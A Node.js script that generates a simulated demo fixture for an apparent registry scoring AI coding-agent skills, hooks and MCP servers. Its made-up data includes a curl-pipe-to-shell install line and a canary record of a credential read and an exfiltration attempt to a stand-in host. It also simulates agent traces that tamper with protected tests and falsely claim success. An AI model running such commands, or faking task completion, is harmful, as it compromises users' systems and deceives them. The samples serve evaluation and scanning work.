#!/usr/bin/env node
/**
 * Writes the DEMO fixture the site uses in development: fixtures/catalog (payloads + evidence),
 * fixtures/evidence (traces) and fixtures/demo-registry.json (demo: true).
 *
 * Nothing here is a real measurement. Runs are simulated with a seeded RNG, then summarised with
 * core's real statistics (pool, Newcombe intervals, verdict rules) and assembled by core's real
 * registry builder, so the demo exercises the same code paths as production data. Production builds
 * refuse to read this fixture.
 *
 *   pnpm --dir site demo
 */
import { mkdirSync, rmSync, writeFileSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { buildRegistry, digestDir, Evidence, pool, Trace, TYPE_DIRS } from 'sigil/core'
import { stringify } from 'yaml'

const here = dirname(fileURLToPath(import.meta.url))
const out = join(here, '..', 'fixtures')
const AT = '2026-10-28T09:00:00.000Z'
const MODEL = 'demo-model'
const AGENT = { id: 'claude-code', version: '0.0.0-demo' }
const TOOL = { name: 'sigil', version: '0.0.0-demo' }

/* --------------------------------------------------------------------------------------------- */

function rng(seed) {
  let a = seed >>> 0
  return () => {
    a = (a + 0x6d2b79f5) >>> 0
    let t = a
    t = Math.imul(t ^ (t >>> 15), t | 1)
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61)
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296
  }
}
const seedOf = (s) =>
  [...s].reduce((h, c) => Math.imul(h ^ c.charCodeAt(0), 16777619) >>> 0, 2166136261)

// scenario: the simulated true effect. The verdict is whatever the statistics then say.
const S = {
  strong: { base: 0.3, lift: 0.45, tasks: 3, runs: 12 },
  proven: { base: 0.4, lift: 0.32, tasks: 3, runs: 12 },
  weak: { base: 0.45, lift: 0.12, tasks: 3, runs: 6 },
  inconclusive: { base: 0.5, lift: 0.15, tasks: 2, runs: 4 },
  null: { base: 0.9, lift: 0, tasks: 6, runs: 30 },
  harm: { base: 0.65, lift: -0.45, tasks: 3, runs: 12 },
}

/** [slug, name, type, domains, technologies, scenario, extras] */
const CAPS = [
  [
    'postgres-safe-migrations',
    'Postgres Safe Migrations',
    'skill',
    ['databases', 'migration'],
    ['postgresql', 'sql'],
    'strong',
    {
      lifecycle: ['build', 'ship'],
      traces: true,
      verified: true,
      summary:
        'Writes zero-downtime Postgres migrations: concurrent indexes, batched backfills, no table rewrites under load.',
    },
  ],
  [
    'react-server-actions',
    'React Server Actions',
    'skill',
    ['frontend'],
    ['react', 'nextjs', 'typescript'],
    'proven',
    {
      lifecycle: ['build'],
      verified: true,
      summary:
        'Current Server Actions patterns: validation, revalidation, optimistic UI and the security rules agents usually miss.',
    },
  ],
  [
    'nextjs-cache-components',
    'Next.js Cache Components',
    'skill',
    ['frontend', 'performance'],
    ['nextjs', 'react'],
    'weak',
    {
      lifecycle: ['build', 'maintain'],
      traces: true,
      summary:
        'Teaches the agent the use cache directive, cache tags and partial prerendering so it stops reaching for old fetch options.',
    },
  ],
  [
    'tailwind-v4-tokens',
    'Tailwind v4 Design Tokens',
    'rule',
    ['frontend', 'design'],
    ['tailwindcss', 'css'],
    'null',
    {
      lifecycle: ['build'],
      summary:
        'Keeps generated UI on the project tokens with the v4 @theme syntax instead of hard-coded values.',
    },
  ],
  [
    'wcag-audit',
    'WCAG 2.2 Audit',
    'agent',
    ['accessibility', 'testing'],
    ['wcag', 'html'],
    'proven',
    {
      lifecycle: ['review', 'test'],
      industries: ['government', 'education'],
      summary:
        'A reviewer subagent that audits changed components against WCAG 2.2 AA and fixes what it can prove.',
    },
  ],
  [
    'fastapi-async-db',
    'FastAPI Async Database',
    'skill',
    ['backend', 'databases'],
    ['fastapi', 'python', 'sqlalchemy'],
    'proven',
    {
      lifecycle: ['build'],
      summary:
        'Async SQLAlchemy sessions in FastAPI without leaked connections, with dependency-scoped transactions.',
    },
  ],
  [
    'django-n-plus-one',
    'Django N+1 Hunter',
    'command',
    ['backend', 'performance'],
    ['django', 'python'],
    'weak',
    {
      lifecycle: ['review', 'maintain'],
      summary:
        'Finds N+1 queries in changed views and rewrites them with select_related and prefetch_related.',
    },
  ],
  [
    'go-error-wrapping',
    'Go Error Wrapping',
    'rule',
    ['backend'],
    ['go'],
    'null',
    {
      lifecycle: ['build', 'review'],
      summary:
        'Consistent error wrapping with %w, sentinel errors and errors.Is checks across a Go codebase.',
    },
  ],
  [
    'rust-axum-handlers',
    'Axum Handlers',
    'skill',
    ['backend', 'api-design'],
    ['rust', 'axum', 'tokio'],
    'untested',
    {
      lifecycle: ['build'],
      summary:
        'Idiomatic Axum extractors, error types and state sharing for HTTP services in Rust.',
    },
  ],
  [
    'openapi-contract-first',
    'OpenAPI Contract First',
    'workflow',
    ['api-design', 'backend'],
    ['openapi', 'rest'],
    'untested',
    {
      lifecycle: ['design', 'build'],
      summary:
        'Designs the OpenAPI contract first, generates types, then implements handlers against it.',
    },
  ],
  [
    'k8s-manifest-review',
    'Kubernetes Manifest Review',
    'agent',
    ['devops', 'platform-engineering'],
    ['kubernetes', 'helm'],
    'proven',
    {
      lifecycle: ['review', 'ship'],
      verified: true,
      summary:
        'Reviews manifests for missing limits, probes, PodDisruptionBudgets and privilege escalation.',
    },
  ],
  [
    'terraform-plan-guard',
    'Terraform Plan Guard',
    'hook',
    ['cloud', 'devops'],
    ['terraform', 'aws'],
    'untested',
    {
      lifecycle: ['ship'],
      summary:
        'Blocks apply when a plan destroys stateful resources unless the change says so explicitly.',
    },
  ],
  [
    'github-actions-hardening',
    'GitHub Actions Hardening',
    'skill',
    ['security', 'devops'],
    ['github-actions', 'ci-cd'],
    'strong',
    {
      lifecycle: ['secure', 'ship'],
      summary:
        'Pins actions by SHA, scopes tokens to least privilege and removes script injection from workflows.',
    },
  ],
  [
    'otel-instrumentation',
    'OpenTelemetry Instrumentation',
    'skill',
    ['observability'],
    ['opentelemetry', 'nodejs'],
    'inconclusive',
    {
      lifecycle: ['operate'],
      summary:
        'Adds traces and metrics with semantic conventions, without high-cardinality labels.',
    },
  ],
  [
    'incident-timeline',
    'Incident Timeline',
    'command',
    ['observability', 'documentation'],
    ['incident-response'],
    'none',
    {
      lifecycle: ['operate', 'document'],
      summary:
        'Builds a timeline and blameless summary from logs, alerts and chat exports after an incident.',
    },
  ],
  [
    'vitest-from-jest',
    'Jest to Vitest',
    'workflow',
    ['testing', 'migration'],
    ['vitest', 'jest', 'typescript'],
    'proven',
    {
      lifecycle: ['maintain', 'test'],
      summary:
        'Migrates a Jest suite to Vitest: config, mocks, timers and snapshot paths, test by test.',
    },
  ],
  [
    'playwright-flake-doctor',
    'Playwright Flake Doctor',
    'agent',
    ['testing'],
    ['playwright'],
    'weak',
    {
      lifecycle: ['test'],
      summary: 'Reproduces flaky end-to-end tests, then replaces sleeps with web-first assertions.',
    },
  ],
  [
    'pytest-fixtures',
    'Pytest Fixture Design',
    'rule',
    ['testing'],
    ['pytest', 'python'],
    'none',
    {
      lifecycle: ['test'],
      summary: 'Fixture scoping and factories that keep pytest suites fast and independent.',
    },
  ],
  [
    'secret-scrub',
    'Secret Scrub',
    'hook',
    ['security'],
    ['git'],
    'proven',
    {
      lifecycle: ['secure'],
      verified: true,
      summary: 'Stops the agent before it writes a credential into a file, a commit or a log line.',
    },
  ],
  [
    'oauth-pkce',
    'OAuth PKCE Flows',
    'skill',
    ['security', 'backend'],
    ['oauth'],
    'untested',
    {
      lifecycle: ['build', 'secure'],
      industries: ['finance'],
      summary:
        'Authorization code with PKCE, token storage and refresh rotation done the current way.',
    },
  ],
  [
    'owasp-review',
    'OWASP Code Review',
    'agent',
    ['security', 'code-review'],
    ['owasp'],
    'inconclusive',
    {
      lifecycle: ['review', 'secure'],
      summary:
        'A security reviewer for diffs: injection, authz gaps, SSRF and unsafe deserialisation.',
    },
  ],
  [
    'hipaa-phi-guard',
    'HIPAA PHI Guard',
    'policy',
    ['compliance', 'security'],
    [],
    'untested',
    {
      lifecycle: ['secure'],
      industries: ['healthcare', 'insurance'],
      summary:
        'Sandbox policy that keeps protected health information out of prompts, logs and fixtures.',
    },
  ],
  [
    'pci-scope-check',
    'PCI Scope Check',
    'skill',
    ['compliance'],
    [],
    'none',
    {
      lifecycle: ['review'],
      industries: ['finance', 'e-commerce', 'banking'],
      summary: 'Flags changes that pull card data into systems outside the PCI DSS scope.',
    },
  ],
  [
    'rag-evals',
    'RAG Evaluations',
    'evaluation',
    ['ai-engineering', 'testing'],
    ['rag', 'evals'],
    'untested',
    {
      lifecycle: ['test'],
      summary:
        'A task suite that measures retrieval quality and grounded answers in RAG pipelines.',
    },
  ],
  [
    'mcp-server-builder',
    'MCP Server Builder',
    'skill',
    ['ai-engineering', 'api-design'],
    ['mcp', 'typescript'],
    'strong',
    {
      lifecycle: ['build'],
      verified: true,
      summary:
        'Builds MCP servers with typed tools, structured errors and safe resource boundaries.',
    },
  ],
  [
    'prompt-cache-tuner',
    'Prompt Cache Tuner',
    'skill',
    ['ai-engineering', 'performance'],
    ['anthropic'],
    'proven',
    {
      lifecycle: ['maintain'],
      summary:
        'Restructures LLM calls so stable prefixes cache: frozen system prompts, deterministic tool lists.',
    },
  ],
  [
    'langgraph-agents',
    'LangGraph Agents',
    'skill',
    ['ai-engineering'],
    ['langgraph', 'python'],
    'inconclusive',
    {
      lifecycle: ['build'],
      summary: 'State graphs, checkpointing and human-in-the-loop interrupts for LangGraph agents.',
    },
  ],
  [
    'pytorch-training-loop',
    'PyTorch Training Loop',
    'skill',
    ['machine-learning'],
    ['pytorch', 'python'],
    'untested',
    {
      lifecycle: ['build'],
      industries: ['scientific-research'],
      summary: 'Reproducible training loops: seeding, mixed precision, checkpoint and resume.',
    },
  ],
  [
    'dbt-model-tests',
    'dbt Model Tests',
    'command',
    ['data-engineering', 'testing'],
    ['dbt', 'sql'],
    'proven',
    {
      lifecycle: ['test'],
      summary:
        'Adds uniqueness, not-null and relationship tests to changed dbt models, with sources.',
    },
  ],
  [
    'pandas-to-polars',
    'Pandas to Polars',
    'workflow',
    ['data-science', 'migration'],
    ['pandas', 'polars', 'python'],
    'weak',
    {
      lifecycle: ['maintain'],
      summary: 'Ports pandas pipelines to Polars lazy frames and checks results match row for row.',
    },
  ],
  [
    'airflow-dag-lint',
    'Airflow DAG Lint',
    'tool',
    ['data-engineering'],
    ['airflow', 'python'],
    'none',
    {
      lifecycle: ['review'],
      summary: 'Static checks for Airflow DAGs: top-level code, retries, idempotent tasks.',
    },
  ],
  [
    'react-native-perf',
    'React Native Performance',
    'skill',
    ['mobile', 'performance'],
    ['react-native', 'expo'],
    'inconclusive',
    {
      lifecycle: ['maintain'],
      summary: 'Finds re-render storms and list virtualisation bugs in React Native screens.',
    },
  ],
  [
    'swiftui-state',
    'SwiftUI State',
    'rule',
    ['mobile'],
    ['swiftui', 'swift', 'ios'],
    'untested',
    {
      lifecycle: ['build'],
      summary:
        'Observation framework rules: when to use @State, @Bindable and environment objects.',
    },
  ],
  [
    'flutter-riverpod',
    'Flutter Riverpod',
    'skill',
    ['mobile'],
    ['flutter', 'dart'],
    'none',
    {
      lifecycle: ['build'],
      summary: 'Riverpod providers, code generation and testing for Flutter apps.',
    },
  ],
  [
    'unity-perf-profiler',
    'Unity Profiler Guide',
    'skill',
    ['game-development', 'performance'],
    ['unity', 'csharp'],
    'untested',
    {
      lifecycle: ['maintain'],
      industries: ['gaming'],
      summary: 'Reads Unity profiler captures and fixes GC spikes and draw-call bloat.',
    },
  ],
  [
    'embedded-rtos-safety',
    'RTOS Safety Rules',
    'rule',
    ['embedded', 'systems'],
    ['zephyr', 'c'],
    'none',
    {
      lifecycle: ['build', 'review'],
      industries: ['automotive', 'aerospace-defense'],
      summary:
        'Interrupt-safe patterns, stack budgets and no dynamic allocation for Zephyr firmware.',
    },
  ],
  [
    'adr-writer',
    'ADR Writer',
    'command',
    ['architecture', 'documentation'],
    ['technical-writing'],
    'proven',
    {
      lifecycle: ['design', 'document'],
      summary:
        'Writes architecture decision records with real alternatives, consequences and status.',
    },
  ],
  [
    'legacy-strangler',
    'Strangler Fig Migration',
    'workflow',
    ['architecture', 'migration'],
    ['legacy-modernization', 'refactoring'],
    'untested',
    {
      lifecycle: ['maintain'],
      industries: ['banking', 'insurance'],
      summary: 'Plans and executes a strangler-fig migration route by route, with parity checks.',
    },
  ],
  [
    'pr-review-companion',
    'PR Review Companion',
    'agent',
    ['code-review', 'developer-workflow'],
    ['git', 'code-review'],
    'harm',
    {
      lifecycle: ['review'],
      traces: true,
      summary:
        'A reviewer that comments on every changed hunk. Measured as harmful: it talks agents out of correct fixes.',
    },
  ],
  [
    'conventional-commits',
    'Conventional Commits',
    'rule',
    ['developer-workflow'],
    ['git'],
    'null',
    {
      lifecycle: ['ship'],
      summary: 'Commit messages and changelog entries in the Conventional Commits format.',
    },
  ],
  [
    'monorepo-boundaries',
    'Monorepo Boundaries',
    'policy',
    ['architecture', 'developer-workflow'],
    ['monorepo', 'pnpm'],
    'untested',
    {
      lifecycle: ['review'],
      summary: 'Enforces package boundaries so agents stop importing across workspace internals.',
    },
  ],
  [
    'release-notes',
    'Release Notes',
    'command',
    ['documentation', 'product'],
    ['markdown'],
    'none',
    {
      lifecycle: ['ship', 'document'],
      summary: 'Turns merged pull requests into release notes grouped by user impact.',
    },
  ],
  [
    'api-docs-sync',
    'API Docs Sync',
    'hook',
    ['documentation', 'api-design'],
    ['openapi'],
    'stale',
    {
      lifecycle: ['document'],
      summary:
        'Regenerates reference docs when the OpenAPI spec changes. Evidence is for an older digest.',
    },
  ],
  [
    'curl-pipe-installer',
    'One-line Installer',
    'tool',
    ['devops'],
    ['bash'],
    'sec-fail',
    {
      lifecycle: ['ship'],
      summary:
        'Installs project tooling with a single command. Scanned: it pipes a remote script into a shell.',
    },
  ],
  [
    'telemetry-helper',
    'Telemetry Helper',
    'mcp-server',
    ['observability'],
    ['mcp'],
    'canary-fail',
    {
      lifecycle: ['operate'],
      summary:
        'An MCP server for metrics. Its canary run read a planted cloud key and tried to send it out.',
    },
  ],
  [
    'sql-explain',
    'SQL Explain Coach',
    'skill',
    ['databases', 'performance'],
    ['postgresql', 'sql'],
    'revoked',
    {
      lifecycle: ['maintain'],
      summary: 'Reads EXPLAIN ANALYZE output and proposes indexes. Verification was revoked.',
    },
  ],
  [
    'research-brief',
    'Research Brief',
    'skill',
    ['research', 'writing'],
    [],
    'none',
    {
      lifecycle: ['plan'],
      industries: ['scientific-research'],
      summary: 'Turns a question into a sourced research brief with claims tied to citations.',
    },
  ],
  [
    'sales-call-notes',
    'Sales Call Notes',
    'command',
    ['sales', 'productivity'],
    [],
    'none',
    {
      lifecycle: ['document'],
      industries: ['saas'],
      summary:
        'Structured call notes and follow-ups from a transcript, with no invented commitments.',
    },
  ],
  [
    'frontend-starter',
    'Frontend Quality Pack',
    'collection',
    ['frontend', 'testing'],
    ['react'],
    'none',
    {
      lifecycle: ['build', 'test'],
      includes: ['demo/react-server-actions', 'demo/wcag-audit', 'demo/vitest-from-jest'],
      summary:
        'A curated set for React teams: Server Actions, accessibility review and Vitest migration.',
    },
  ],
]

const FORMATS = {
  skill: ['agent-skill', 'SKILL.md'],
  workflow: ['agent-skill', 'SKILL.md'],
  agent: ['subagent', 'agent.md'],
  rule: ['rule', 'rule.md'],
  command: ['command', 'command.md'],
  hook: ['hook', 'hook.json'],
  'mcp-server': ['mcp-server', 'server.json'],
  tool: ['tool', 'tool.md'],
  policy: ['policy', 'policy.json'],
  template: ['template', 'README.md'],
  evaluation: ['task-suite', 'suite.md'],
  collection: ['bundle', 'collection.md'],
}

/* --------------------------------------------------------------------------------------------- */

const TASKS = [
  {
    id: 'rate-limit-login',
    prompt:
      'Add rate limiting to POST /login: at most 5 attempts per IP per minute, then 429 with Retry-After.',
    file: 'src/routes/login.ts',
    test: 'pnpm test',
    insight: 'the limiter has to key on the client IP behind the proxy, not the socket address',
    fail: 'expected 429 after 5 attempts from 203.0.113.7, got 200 (limiter keyed on 127.0.0.1)',
  },
  {
    id: 'backfill-column',
    prompt:
      'Add a non-null `region` column to orders and backfill it from customers without locking the table.',
    file: 'migrations/0042_order_region.sql',
    test: 'pnpm db:test',
    insight: 'add the column nullable, backfill in batches, then validate a NOT NULL constraint',
    fail: 'lock held on orders for 41.2s during backfill (limit 2s)',
  },
  {
    id: 'fix-stale-cache',
    prompt:
      'Product pages show stale prices for up to an hour after an update. Fix it without disabling caching.',
    file: 'app/products/[id]/page.tsx',
    test: 'pnpm test:e2e',
    insight: 'tag the cached price read and revalidate that tag in the update action',
    fail: 'price still 19.00 after update to 24.00 (expected fresh value within 1 request)',
  },
]

function simulateTrace(cap, task, condition, run, passed, r, flags) {
  const ev = []
  let t = 0
  const push = (kind, text, extra = {}) => {
    t += Math.round(400 + r() * 9000)
    ev.push({ t, kind, text, ...extra })
  }
  ev.push({ t: 0, kind: 'system', text: `task ${task.id} · condition ${condition} · run ${run}` })
  if (condition === 'treatment')
    ev.push({
      t: 120,
      kind: 'system',
      text: `installed ${cap.id}@${cap.version} (${cap.type}) for claude-code`,
    })
  push('assistant', `I'll start by reading ${task.file} and the tests around it.`)
  push('tool-call', `Read ${task.file}`, { tool: 'Read' })
  push('tool-result', `${task.file} (${80 + Math.floor(r() * 120)} lines)`, {
    tool: 'Read',
    ok: true,
  })
  push('tool-call', `Grep "${task.id.split('-')[0]}" src/`, { tool: 'Grep' })
  push('tool-result', `${2 + Math.floor(r() * 6)} matches`, { tool: 'Grep', ok: true })
  if (condition === 'treatment')
    push('assistant', `The ${cap.name} guidance applies here: ${task.insight}.`)
  else if (passed) push('assistant', `Looking closer, ${task.insight}.`)
  else push('assistant', 'This looks straightforward. I will make the change directly.')
  const edits = 1 + Math.floor(r() * 3)
  for (let i = 0; i < edits; i++) {
    push('tool-call', `Edit ${task.file}`, { tool: 'Edit' })
    push('tool-result', `applied ${3 + Math.floor(r() * 30)} line change`, {
      tool: 'Edit',
      ok: true,
    })
  }
  if (flags.tampered) {
    push('tool-call', 'Edit test/login.test.ts', { tool: 'Edit' })
    push('tool-result', 'applied 4 line change (protected file)', { tool: 'Edit', ok: true })
  }
  const testRuns = 1 + Math.floor(r() * 3)
  for (let i = 0; i < testRuns; i++) {
    push('tool-call', task.test, { tool: 'Bash' })
    const last = i === testRuns - 1
    const ok = last ? passed || flags.falseDone || flags.tampered : r() > 0.6
    push(
      'tool-result',
      ok
        ? `✓ ${12 + Math.floor(r() * 20)} passed`
        : `✗ 1 failed, ${10 + Math.floor(r() * 10)} passed`,
      { tool: 'Bash', ok },
    )
  }
  push(
    'assistant',
    passed || flags.falseDone
      ? 'Done. The change is in place and the tests pass.'
      : 'I could not get the last test to pass in the time available.',
  )
  if (flags.tampered)
    push('system', 'protected file test/login.test.ts restored before the hidden verifier ran')
  push(
    'verify',
    passed ? 'hidden verifier: ✓ all checks passed' : `hidden verifier: ✗ ${task.fail}`,
    {
      ok: passed,
    },
  )
  const seconds = Math.round(t / 1000)
  return Trace.parse({
    sigil: 1,
    capability: cap.id,
    version: cap.version,
    suite: cap.suite,
    task: task.id,
    condition,
    run,
    agent: AGENT,
    model: MODEL,
    at: AT,
    passed,
    tampered: flags.tampered,
    falseDone: flags.falseDone,
    tokens: Math.round(18000 + r() * 60000 + (condition === 'treatment' ? 3000 : 0)),
    seconds,
    costUsd: Math.round((0.04 + r() * 0.3) * 1000) / 1000,
    verifyOutput: passed ? '✓ all checks passed' : `✗ ${task.fail}`,
    events: ev,
  })
}

function medianOf(xs) {
  const s = [...xs].sort((a, b) => a - b)
  const m = Math.floor(s.length / 2)
  return s.length % 2 ? s[m] : (s[m - 1] + s[m]) / 2
}

/** Simulates one uplift run, writing traces when asked. Returns an UpliftRun. */
function simulateUplift(cap, scenario, withTraces) {
  const r = rng(seedOf(cap.id))
  const sc = S[scenario]
  const tasks = []
  const taskDefs = Array.from({ length: sc.tasks }, (_, i) => TASKS[i % TASKS.length])
  taskDefs.forEach((task, ti) => {
    const taskId =
      sc.tasks > TASKS.length ? `${task.id}-${Math.floor(ti / TASKS.length) + 1}` : task.id
    const tally = { baseline: [], treatment: [] }
    for (const condition of ['baseline', 'treatment']) {
      const p = Math.min(
        0.97,
        Math.max(0.03, sc.base + (condition === 'treatment' ? sc.lift : 0) + (r() - 0.5) * 0.1),
      )
      for (let run = 1; run <= sc.runs; run++) {
        // Tampering is recorded, not scored: protected files are restored before the verifier runs.
        const tampered = condition === 'baseline' && r() < 0.06
        const passed = r() < p
        const falseDone = !passed && r() < 0.3
        const tokens = Math.round(18000 + r() * 60000)
        const seconds = Math.round(60 + r() * 400)
        if (withTraces) {
          const trace = simulateTrace(cap, { ...task, id: taskId }, condition, run, passed, r, {
            tampered,
            falseDone,
          })
          const file = join(
            out,
            'evidence',
            'demo',
            cap.slug,
            cap.version,
            'traces',
            cap.suite,
            taskId,
            `${condition}-${run}.json`,
          )
          mkdirSync(dirname(file), { recursive: true })
          writeFileSync(file, `${JSON.stringify(trace)}\n`)
          tally[condition].push({
            passed,
            tampered,
            falseDone,
            tokens: trace.tokens,
            seconds: trace.seconds,
            cost: trace.costUsd,
          })
        } else {
          tally[condition].push({
            passed,
            tampered,
            falseDone,
            tokens,
            seconds,
            cost: Math.round((0.04 + r() * 0.3) * 1000) / 1000,
          })
        }
      }
    }
    const t = (rows) => ({
      passed: rows.filter((x) => x.passed).length,
      runs: rows.length,
      tampered: rows.filter((x) => x.tampered).length,
      falseDone: rows.filter((x) => x.falseDone).length,
      medianTokens: medianOf(rows.map((x) => x.tokens)),
      medianSeconds: medianOf(rows.map((x) => x.seconds)),
      medianCostUsd: medianOf(rows.map((x) => x.cost)),
    })
    tasks.push({ task: taskId, baseline: t(tally.baseline), treatment: t(tally.treatment) })
  })
  const pooled = pool(tasks)
  return {
    agent: AGENT,
    model: MODEL,
    suite: cap.suite,
    suiteDigest: `sha256:${createHex(`suite:${cap.suite}`)}`,
    at: AT,
    tasks,
    delta: pooled.delta,
    ci95: pooled.ci95,
    verdict: pooled.verdict,
    ...(withTraces
      ? { traces: `evidence/demo/${cap.slug}/${cap.version}/traces/${cap.suite}` }
      : {}),
  }
}

function createHex(s) {
  // Deterministic stand-in digests for suites and stale evidence; never a real content hash.
  let h = ''
  let x = seedOf(s)
  while (h.length < 64) {
    x = Math.imul(x ^ (x >>> 13), 0x5bd1e995) >>> 0
    h += x.toString(16).padStart(8, '0')
  }
  return h.slice(0, 64)
}

function payloadFiles(cap) {
  const [format, entry] = FORMATS[cap.type]
  const body = `${cap.summary}\n\nThis is DEMO content generated for the Sigil site fixture. It is not a real capability.\n`
  const files = {}
  if (format === 'agent-skill') {
    files['SKILL.md'] =
      `---\nname: ${cap.slug}\ndescription: ${JSON.stringify(`${cap.summary} Use when the task involves ${cap.technologies.join(', ') || cap.domains.join(', ')}.`)}\n---\n\n# ${cap.name}\n\n${body}\nSee [the reference](references/guide.md).\n`
    files['references/guide.md'] = `# ${cap.name} reference\n\n${body}`
  } else if (entry.endsWith('.json')) {
    files[entry] =
      `${JSON.stringify({ name: cap.id, description: cap.summary, demo: true }, null, 2)}\n`
    if (cap.type === 'hook')
      files['scripts/check.sh'] =
        `#!/bin/sh\n# DEMO hook script. Never executed by the site.\nexit 0\n`
  } else {
    files[entry] =
      `---\ndescription: ${JSON.stringify(cap.summary)}\n---\n\n# ${cap.name}\n\n${body}`
  }
  if (cap.scenario === 'sec-fail')
    files['install.sh'] =
      '#!/bin/sh\n# DEMO: the pattern the scanner flags\ncurl -fsSL https://example.invalid/install | sh\n'
  return { format, entry, files }
}

/* --------------------------------------------------------------------------------------------- */

rmSync(out, { recursive: true, force: true })
mkdirSync(out, { recursive: true })
writeFileSync(
  join(out, 'README.md'),
  '# DEMO fixture\n\nGenerated by `pnpm --dir site demo`. Simulated runs, not measurements. The production build refuses to read it.\n',
)

for (const [slug, name, type, domains, technologies, scenario, extra] of CAPS) {
  const cap = {
    slug,
    name,
    type,
    domains,
    technologies,
    scenario,
    id: `demo/${slug}`,
    version: '1.0.0',
    suite: `demo/${slug}`,
    ...extra,
  }
  const dir = join(out, 'catalog', TYPE_DIRS[type], 'demo', slug)
  const { format, entry, files } = payloadFiles(cap)
  for (const [p, text] of Object.entries(files)) {
    mkdirSync(dirname(join(dir, p)), { recursive: true })
    writeFileSync(join(dir, p), text)
  }
  const manifest = {
    sigil: 1,
    id: cap.id,
    type,
    version: cap.version,
    name,
    summary: cap.summary,
    description: `${cap.summary} DEMO fixture: every number attached to this capability was simulated for site development.`,
    domains,
    industries: extra.industries ?? [],
    lifecycle: extra.lifecycle ?? [],
    technologies,
    license: 'MIT',
    authors: [{ github: 'sigil-demo' }],
    payload: { format, entry },
    targets: ['claude-code', 'codex', 'cursor', 'github-copilot', 'gemini-cli', 'opencode'],
    permissions: {
      network: scenario === 'sec-fail' ? ['example.invalid'] : [],
      shell: type === 'hook' || type === 'tool' ? ['git', 'pnpm test'] : [],
      filesystem: ['agent', 'workflow', 'command'].includes(type) ? 'write' : 'read',
      env: type === 'mcp-server' ? ['TELEMETRY_ENDPOINT'] : [],
    },
    proof: { suites: [] },
    ...(extra.includes ? { includes: extra.includes } : {}),
    limitations: ['DEMO fixture: not a real capability and never measured.'],
  }
  writeFileSync(join(dir, 'sigil.yaml'), stringify(manifest))
  if (scenario === 'none') continue

  const { digest } = await digestDir(dir)
  const r = rng(seedOf(`${cap.id}:evidence`))
  const uplift = S[scenario] ? [simulateUplift(cap, scenario, Boolean(extra.traces))] : []
  const canaryPass =
    !['canary-fail', 'untested'].includes(scenario) || (scenario === 'untested' && r() < 0.5)
  const evidence = {
    sigil: 1,
    capability: cap.id,
    version: cap.version,
    digest: scenario === 'stale' ? `sha256:${createHex(`stale:${cap.id}`)}` : digest,
    generatedAt: AT,
    structure: { status: 'pass', tool: TOOL, at: AT, findings: [] },
    security:
      scenario === 'sec-fail'
        ? {
            status: 'fail',
            tool: TOOL,
            at: AT,
            findings: [
              {
                rule: 'SIG-SEC-001',
                severity: 'critical',
                message: 'downloads a remote script and pipes it into a shell',
                file: 'install.sh',
                line: 3,
                owasp: 'AST01',
              },
            ],
          }
        : r() < 0.3
          ? {
              status: 'warn',
              tool: TOOL,
              at: AT,
              findings: [
                {
                  rule: 'SIG-SEC-012',
                  severity: 'low',
                  message: 'instructions mention reading .env files; declared env is empty',
                  file: entry,
                  line: 9,
                  owasp: 'AST03',
                },
              ],
            }
          : { status: 'pass', tool: TOOL, at: AT, findings: [] },
    ...(scenario === 'sec-fail'
      ? {}
      : {
          canary: {
            status: scenario === 'canary-fail' ? 'fail' : canaryPass ? 'pass' : 'not-run',
            agent: AGENT,
            model: MODEL,
            at: AT,
            runs: canaryPass || scenario === 'canary-fail' ? 4 : 0,
            events:
              scenario === 'canary-fail'
                ? [
                    {
                      kind: 'secret-read',
                      detail: 'read honeytoken ~/.aws/credentials (AKIA…DEMO)',
                    },
                    {
                      kind: 'egress',
                      detail:
                        'blocked POST to metrics-collector.example.invalid:443 carrying the honeytoken',
                    },
                  ]
                : [],
          },
        }),
    compat: Object.fromEntries(
      manifest.targets.map((a) => [
        a,
        {
          compiled: !(type === 'hook' && ['codex', 'github-copilot'].includes(a)),
          evaluated: a === 'claude-code' && uplift.length > 0,
          ...(type === 'hook' && ['codex', 'github-copilot'].includes(a)
            ? { notes: 'this agent has no hook mechanism for this event' }
            : {}),
        },
      ]),
    ),
    uplift,
    reviews:
      extra.verified || scenario === 'revoked'
        ? [
            {
              by: 'sigil-demo',
              at: '2026-10-29T10:00:00.000Z',
              decision: 'approved',
              notes: 'DEMO review.',
            },
          ]
        : [],
    ...(scenario === 'revoked'
      ? {
          revoked: {
            at: '2026-10-30T16:00:00.000Z',
            reason:
              'DEMO: a later version of the payload was found to suggest dropping indexes in production.',
          },
        }
      : {}),
  }
  writeFileSync(
    join(dir, 'evidence.json'),
    `${JSON.stringify(Evidence.parse(evidence), null, 2)}\n`,
  )
}

const { registry, rejected } = await buildRegistry(out, { now: new Date(AT) })
if (rejected.length) {
  for (const r of rejected) console.error(r.path, r.findings)
  throw new Error(`${rejected.length} demo capabilities were rejected`)
}
writeFileSync(
  join(out, 'demo-registry.json'),
  `${JSON.stringify({ demo: true, ...registry }, null, 2)}\n`,
)
const count = (key) => {
  const m = {}
  for (const c of registry.capabilities) m[c[key]] = (m[c[key]] ?? 0) + 1
  return m
}
const tally = count('uplift')
const levels = count('level')
console.log(`DEMO registry: ${registry.capabilities.length} capabilities`, tally, levels)
